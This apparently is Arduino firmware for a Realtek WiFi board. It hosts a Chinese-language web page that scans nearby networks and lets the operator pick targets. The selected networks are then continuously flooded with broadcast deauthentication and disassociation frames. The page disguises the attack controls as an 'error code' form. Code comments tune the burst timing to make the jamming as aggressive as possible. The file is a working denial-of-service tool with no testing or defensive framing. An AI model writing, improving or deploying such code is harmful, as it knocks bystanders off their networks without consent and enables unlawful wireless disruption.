#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// LEDs:
//  Red: System usable, Web server active etc.
//  Green: Web Server communication happening
//  Blue: Deauth-Frame being sent

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

char *ssid = "星烁的Xiaomi_SU7";
char *pass = "1234567890v";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::vector<int> deauth_wifis;
WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;

// 非阻塞攻击调度状态
static uint32_t deauth_last_burst_ms = 0;
static size_t deauth_round_robin_index = 0;
static uint8_t last_deauth_channel = 0;

#define FRAMES_PER_DEAUTH 10          // 每个目标每轮发送的帧对数（deauth + disassoc 各一）
#define DEAUTH_BURST_INTERVAL_MS 10   // 目标轮换间隔（毫秒），越小压制越猛
#define MAX_REQUEST_BYTES 4096        // HTTP 请求体大小上限

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    uint8_t ssid_len = record->SSID.len;
    if (ssid_len >= sizeof(record->SSID.val)) ssid_len = sizeof(record->SSID.val) - 1;
    record->SSID.val[ssid_len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

std::vector<std::pair<String, String>> parsePost(String &request) {
    std::vector<std::pair<String, String>> post_params;

    // Find the start of the body
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params; // Return an empty vector if no body found
    }
    body_start += 4;

    // Extract the POST data
    String post_data = request.substring(body_start);

    int start = 0;
    int end = post_data.indexOf('&', start);

    // Loop through the key-value pairs
    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');

        if (delimiter_position != -1) {
            String key = urlDecode(key_value_pair.substring(0, delimiter_position));
            String value = urlDecode(key_value_pair.substring(delimiter_position + 1));
            post_params.push_back({key, value});
        }

        start = end + 1;
        end = post_data.indexOf('&', start);
    }

    // Handle the last key-value pair
    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = urlDecode(key_value_pair.substring(0, delimiter_position));
        String value = urlDecode(key_value_pair.substring(delimiter_position + 1));
        post_params.push_back({key, value});
    }

    return post_params;
}

int hexValue(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}

String urlDecode(const String &input) {
  String out;
  out.reserve(input.length());
  for (unsigned int i = 0; i < input.length(); i++) {
    char c = input[i];
    if (c == '+') {
      out += ' ';
    } else if (c == '%' && i + 2 < input.length()) {
      int hi = hexValue(input[i + 1]);
      int lo = hexValue(input[i + 2]);
      if (hi >= 0 && lo >= 0) {
        out += (char)((hi << 4) | lo);
        i += 2;
      } else {
        out += c;
      }
    } else {
      out += c;
    }
  }
  return out;
}

String htmlEscape(const String &input) {
  String out;
  out.reserve(input.length() + 16);
  for (unsigned int i = 0; i < input.length(); i++) {
    char c = input[i];
    switch (c) {
      case '&':  out += "&amp;";  break;
      case '<':  out += "&lt;";   break;
      case '>':  out += "&gt;";   break;
      case '"':  out += "&quot;"; break;
      case '\'': out += "&#39;";  break;
      default:   out += c;        break;
    }
  }
  return out;
}

String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\r\n";
  response += "Location: " + url + "\r\n";
  response += "Connection: close\r\n\r\n";
  return response;
}

void handleRoot(WiFiClient &client) {
  String response = makeResponse(200, "text/html") + R"(
  <!DOCTYPE html>
  <html lang="zh-CN">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>雾的思绪</title>
      <style>
          :root {
              --md-primary: #1a73e8;
              --md-on-primary: #ffffff;
              --md-surface: #ffffff;
              --md-background: #f8f9fa;
              --md-on-surface: #202124;
              --md-on-surface-variant: #5f6368;
              --md-outline: #dadce0;
              --md-danger: #d93025;
          }
          * { box-sizing: border-box; }
          body {
              margin: 0;
              background: var(--md-background);
              color: var(--md-on-surface);
              font-family: Roboto, "Segoe UI", "Microsoft YaHei", "PingFang SC", "Noto Sans SC", sans-serif;
              line-height: 1.6;
          }
          .top-bar {
              background: #ffffff;
              color: #202124;
              padding: 14px 24px;
              font-size: 20px;
              font-weight: 500;
              letter-spacing: .5px;
              position: sticky;
              top: 0;
              z-index: 10;
              border-bottom: 1px solid var(--md-outline);
          }
          .container {
              max-width: 920px;
              margin: 0 auto;
              padding: 24px 16px 56px;
              display: flex;
              flex-direction: column;
              gap: 20px;
          }
          .card {
              background: var(--md-surface);
              border-radius: 20px;
              padding: 20px 24px;
              border: 1px solid var(--md-outline);
          }
          .card h2 {
              margin: 0 0 16px;
              font-size: 16px;
              font-weight: 500;
          }
          table {
              width: 100%;
              border-collapse: collapse;
          }
          th, td {
              padding: 12px 10px;
              text-align: left;
              border-bottom: 1px solid var(--md-outline);
          }
          th {
              font-size: 13px;
              font-weight: 500;
              color: var(--md-on-surface-variant);
          }
          td { font-size: 14px; }
          tr:last-child td { border-bottom: none; }
          .checkbox-label {
              display: inline-flex;
              align-items: center;
              gap: 8px;
              margin-bottom: 14px;
              font-size: 14px;
              color: var(--md-on-surface-variant);
              cursor: pointer;
          }
          .wifi-list {
              display: flex;
              flex-direction: column;
              gap: 10px;
              margin-bottom: 4px;
          }
          .wifi-item {
              display: flex;
              align-items: center;
              gap: 12px;
              padding: 14px 16px;
              border: 1px solid var(--md-outline);
              border-radius: 16px;
              cursor: pointer;
              flex-wrap: wrap;
              transition: border-color .15s, background-color .15s;
          }
          .wifi-item:hover {
              border-color: var(--md-primary);
              background-color: #f5f9ff;
          }
          .wifi-item input[type=checkbox] {
              width: 18px;
              height: 18px;
              margin: 0;
              accent-color: var(--md-primary);
              flex-shrink: 0;
          }
          .wifi-index {
              min-width: 22px;
              text-align: center;
              font-size: 13px;
              color: var(--md-on-surface-variant);
              flex-shrink: 0;
          }
          .wifi-name {
              flex: 1;
              min-width: 120px;
              font-size: 15px;
              font-weight: 500;
              word-break: break-all;
          }
          .wifi-bssid {
              font-family: "SFMono-Regular", Consolas, "Liberation Mono", monospace;
              font-size: 12.5px;
              color: var(--md-on-surface-variant);
              white-space: nowrap;
          }
          .chip {
              display: inline-block;
              font-size: 12px;
              color: var(--md-on-surface-variant);
              background: var(--md-background);
              border-radius: 999px;
              padding: 4px 10px;
              white-space: nowrap;
          }
          .chip-band {
              color: var(--md-primary);
              background: #e8f0fe;
          }
          .field {
              display: flex;
              align-items: center;
              gap: 12px;
              margin: 18px 0 14px;
              font-size: 14px;
          }
          .field input[type=text] {
              flex: 1;
              border: 1px solid var(--md-outline);
              border-radius: 4px;
              padding: 10px 12px;
              font-size: 14px;
              font-family: inherit;
              color: var(--md-on-surface);
              background: var(--md-surface);
          }
          .field input[type=text]:focus {
              outline: none;
              border-color: var(--md-primary);
          }
          .btn {
              border: none;
              border-radius: 999px;
              padding: 10px 24px;
              font-size: 14px;
              font-weight: 500;
              font-family: inherit;
              letter-spacing: .25px;
              cursor: pointer;
          }
          .btn-primary { background: var(--md-primary); color: #fff; }
          .btn-primary:hover { background: #1765cc; }
          .btn-outline {
              background: transparent;
              color: var(--md-primary);
              border: 1px solid var(--md-primary);
          }
          .btn-outline:hover { background: rgba(26,115,232,.08); }
          .btn-danger { background: var(--md-danger); color: #fff; }
          .btn-danger:hover { background: #c5221f; }
          .action-row {
              display: flex;
              align-items: center;
              gap: 16px;
              flex-wrap: wrap;
          }
          .caption {
              font-size: 13px;
              color: var(--md-on-surface-variant);
              margin: 0;
          }
          .footer {
              text-align: center;
              font-size: 13px;
              color: var(--md-on-surface-variant);
              line-height: 1.9;
              padding: 8px 0;
          }
          .footer strong { font-weight: 400; }
      </style>
      <script>
          function updateSelectAll() {
              var checkboxes = document.querySelectorAll('input[name="network"]');
              var selectAllCheckbox = document.getElementById('selectAllCheckbox');
              var allChecked = true;
              for (var i = 0; i < checkboxes.length; i++) {
                  if (!checkboxes[i].checked) {
                      allChecked = false;
                      break;
                  }
              }
              selectAllCheckbox.checked = allChecked;
          }

          function toggleSelectAll() {
              var checkboxes = document.querySelectorAll('input[name="network"]');
              var selectAllCheckbox = document.getElementById('selectAllCheckbox');
              for (var i = 0; i < checkboxes.length; i++) {
                  checkboxes[i].checked = selectAllCheckbox.checked;
              }
          }

          // 页面加载后绑定事件
          window.onload = function() {
              var checkboxes = document.querySelectorAll('input[name="network"]');
              for (var i = 0; i < checkboxes.length; i++) {
                  checkboxes[i].addEventListener('change', updateSelectAll);
              }
              document.getElementById('selectAllCheckbox').addEventListener('change', toggleSelectAll);
          };
      </script>
  </head>
  <body>
      <div class="top-bar">雾的思绪</div>
      <div class="container">

          <form method="post" action="/deauth" class="card">
              <h2>WiFi 列表</h2>
              <label class="checkbox-label">
                  <input type="checkbox" id="selectAllCheckbox"> 全选/取消全选
              </label>
              <div class="wifi-list">
  )";

  // 预分配容量：一次估算好最终页面大小，避免拼接表格时 String 反复扩容拷贝
  response.reserve(response.length() + 300 * (unsigned int)scan_results.size() + 8192);

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    response += "<label class='wifi-item'>";
    response += "<input type='checkbox' name='network' value='" + String(i) + "'>";
    response += "<span class='wifi-index'>" + String(i) + "</span>";
    response += "<span class='wifi-name'>" + htmlEscape(scan_results[i].ssid) + "</span>";
    response += "<span class='wifi-bssid'>" + scan_results[i].bssid_str + "</span>";
    response += "<span class='chip'>信道 " + String(scan_results[i].channel) + "</span>";
    response += "<span class='chip'>" + String(scan_results[i].rssi) + " dB</span>";
    response += "<span class='chip chip-band'>" + (String)((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</span>";
    response += "</label>";
  }

  response += R"(
              </div>
              <div class="field">
                  <span>请填写错误代码:</span>
                  <input type="text" name="reason" placeholder="初识你名 久居我心">
              </div>
              <div class="action-row">
                  <input type="submit" class="btn btn-primary" value="提交">
                  <span class="caption">让每个人都能享受科技的乐趣</span>
              </div>
          </form>

          <div class="card">
              <h2>操作</h2>
              <div class="action-row">
                  <form method="post" action="/rescan">
                      <input type="submit" class="btn btn-outline" value="扫描">
                  </form>
                  <span class="caption">科技的终点是让人感受幸福 抵达美好（扫描）</span>
              </div>
              <div class="action-row" style="margin-top:12px;">
                  <form method="post" action="/stop">
                      <input type="submit" class="btn btn-danger" value="停止攻击">
                  </form>
              </div>
          </div>

          <div class="card">
              <h2>错误代码</h2>
              <table>
                  <tr><th>代码</th><th>含义（通俗解释）</th></tr>
                  <tr><td>0</td><td>保留代码 (一般不用，留作特殊标记)</td></tr>
                  <tr><td>1</td><td>未指定原因 (就是不知道为啥断开了)</td></tr>
                  <tr><td>2</td><td>先前认证已失效 (之前验证过的密码或凭证现在没用了)</td></tr>
                  <tr><td>3</td><td>离开独立基本服务集(IBSS)或ESS (设备主动离开了这个网络)</td></tr>
                  <tr><td>4</td><td>因不活动解除关联 (太久没上网，被踢了)</td></tr>
                  <tr><td>5</td><td>AP无法处理所有关联设备 (路由器忙不过来了)</td></tr>
                  <tr><td>6</td><td>从未认证设备收到Class 2帧 (还没认证就乱发数据)</td></tr>
                  <tr><td>7</td><td>从未关联设备收到Class 3帧 (还没连上就乱发数据)</td></tr>
                  <tr><td>8</td><td>因离开基本服务集(BSS)解除关联 (主动离开这个WiFi)</td></tr>
                  <tr><td>9</td><td>设备未通过认证 (密码错误或者被拒绝了)</td></tr>
                  <tr><td>10</td><td>电源能力信息不可接受 (设备供电有问题)</td></tr>
                  <tr><td>11</td><td>支持的信道信息不可接受 (设备不支持的WiFi频道)</td></tr>
                  <tr><td>12</td><td>BSS转换管理解除关联 (路由器让你换个连接点)</td></tr>
                  <tr><td>13</td><td>无效信息元素 (数据包里有错误的信息)</td></tr>
                  <tr><td>14</td><td>消息完整性校验(MIC)失败 (密码可能被破解或数据被篡改)</td></tr>
                  <tr><td>15</td><td>4次握手超时 (连接过程中没响应，超时了)</td></tr>
                  <tr><td>16</td><td>组密钥握手超时 (更新加密钥匙时没回应)</td></tr>
                  <tr><td>17</td><td>4次握手信息元素不匹配 (协商加密时数据对不上)</td></tr>
                  <tr><td>18</td><td>无效的组密码 (广播加密方式不支持)</td></tr>
                  <tr><td>19</td><td>无效的成对密码 (个人加密方式不支持)</td></tr>
                  <tr><td>20</td><td>无效的AKMP (身份验证方式不支持)</td></tr>
                  <tr><td>21</td><td>不支持的RSNE版本 (WiFi安全协议版本太老或太新)</td></tr>
                  <tr><td>22</td><td>无效的RSNE能力 (安全配置里的能力值有误)</td></tr>
                  <tr><td>23</td><td>IEEE 802.1X认证失败 (企业级WiFi的账户验证没通过)</td></tr>
                  <tr><td>24</td><td>因安全策略拒绝密码套件 (路由器设置了更严格的规则，不让用这套加密)</td></tr>
              </table>
          </div>

          <div class="footer">
              <strong>“我的每个要求你都向我妥协 你的泪滴像秋天的落叶”</strong><br>
              <strong>“你的每个要求我都向你妥协 我的泪滴像冬天的落雪 「X!NG$HUO NAO」 MADE THIS PLAN”</strong>
          </div>

      </div>
  </body>
  </html>
  )";

  client.write(response.c_str());
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain");
  response += "Not found!";
  client.write(response.c_str());
}

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  if (scanNetworks()) {
    delay(1000);
  }

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif

  server.begin();

  digitalWrite(LED_R, HIGH);
}

void loop() {
  WiFiClient client = server.available();
  if (client.connected()) {
    digitalWrite(LED_G, HIGH);
    String request;
    request.reserve(256);
    bool too_large = false;
    char buf[128];
    while (client.available()) {
      // 分块读入缓冲区再一次性追加，避免逐字节 String 拼接的重复扩容
      int n = 0;
      while (client.available() && n < (int)sizeof(buf) - 1 &&
             request.length() + (unsigned int)n < MAX_REQUEST_BYTES) {
        buf[n++] = (char)client.read();
      }
      if (n > 0) {
        buf[n] = 0;
        request += buf;
      }
      if (request.length() >= MAX_REQUEST_BYTES) { too_large = true; break; }
      delay(1);
    }
    DEBUG_SER_PRINT(request);
    String path = parseRequest(request);
    DEBUG_SER_PRINT("\nRequested path: " + path + "\n");

    if (too_large) {
      handle404(client);
    } else if (path == "/") {
      handleRoot(client);
    } else if (path == "/rescan") {
      deauth_wifis.clear();
      deauth_round_robin_index = 0;
      client.write(makeRedirect("/").c_str());
      while (scanNetworks()) {
        delay(1000);
      }
    } else if (path == "/stop") {
      deauth_wifis.clear();
      deauth_round_robin_index = 0;
      digitalWrite(LED_B, LOW);
      client.write(makeRedirect("/").c_str());
    } else if (path == "/deauth") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "network") {
          int idx = param.second.toInt();
          if (idx >= 0 && idx < (int)scan_results.size()) {
            deauth_wifis.push_back(idx);
          }
        } else if (param.first == "reason") {
          deauth_reason = (uint16_t)param.second.toInt();
        }
      }
      client.write(makeRedirect("/").c_str());
    } else {
      handle404(client);
    }

    client.stop();
    digitalWrite(LED_G, LOW);
  }
  
  // 非阻塞攻击调度：每隔 DEAUTH_BURST_INTERVAL_MS 轮换一个目标
  if (!deauth_wifis.empty()) {
    uint32_t now = millis();
    if (now - deauth_last_burst_ms >= DEAUTH_BURST_INTERVAL_MS) {
      deauth_last_burst_ms = now;
      if (deauth_round_robin_index >= deauth_wifis.size()) deauth_round_robin_index = 0;
      int target = deauth_wifis[deauth_round_robin_index];
      deauth_round_robin_index++;
      if (target >= 0 && target < (int)scan_results.size()) {
        memcpy(deauth_bssid, scan_results[target].bssid, 6);
        // 仅当信道真正变化时才切信道，把时间都省下来发帧
        if (scan_results[target].channel != last_deauth_channel) {
          wext_set_channel(WLAN0_NAME, scan_results[target].channel);
          last_deauth_channel = scan_results[target].channel;
        }
        digitalWrite(LED_B, HIGH);
        // 去认证 + 解除关联双帧连发，紧凑循环不发 delay，帧率最大化
        for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
          wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
          wifi_tx_disassoc_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        }
        digitalWrite(LED_B, LOW);
      }
    }
  }
}
